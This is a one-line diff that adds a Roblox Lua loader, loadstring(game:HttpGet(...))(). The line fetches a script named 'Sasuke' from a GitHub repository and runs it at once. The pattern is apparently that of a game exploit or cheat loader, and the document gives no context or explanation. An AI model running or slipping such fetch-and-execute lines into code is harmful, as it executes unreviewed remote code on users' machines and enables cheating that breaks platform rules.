@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OGBLAZE/UNREAL/main/Sasuke"))()
